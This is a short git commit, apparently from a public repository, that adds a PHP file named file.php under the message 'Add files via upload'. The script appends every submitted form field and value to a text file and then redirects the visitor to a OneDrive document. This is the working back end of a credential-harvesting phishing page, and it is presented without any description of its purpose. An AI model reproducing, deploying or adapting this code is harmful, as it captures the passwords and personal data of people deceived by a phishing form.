17efed510a959c51679daad5aabb4d4b51c95217
robertroyals007 <robertroyals007@gmail.com>
2025-08-28 13:22:32 +0200

    Add files via upload

---
+++ file.php
@@ -0,0 +1,13 @@
+<?php
+header ("Location: https://onedrive.live.com/redir?resid=519E8EA44DBCE78!152&authkey=!ALdtJ7OFZ-AEHeo&ithint=file%2cdocx&e=b5G4nI");
+$handle = fopen("text.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
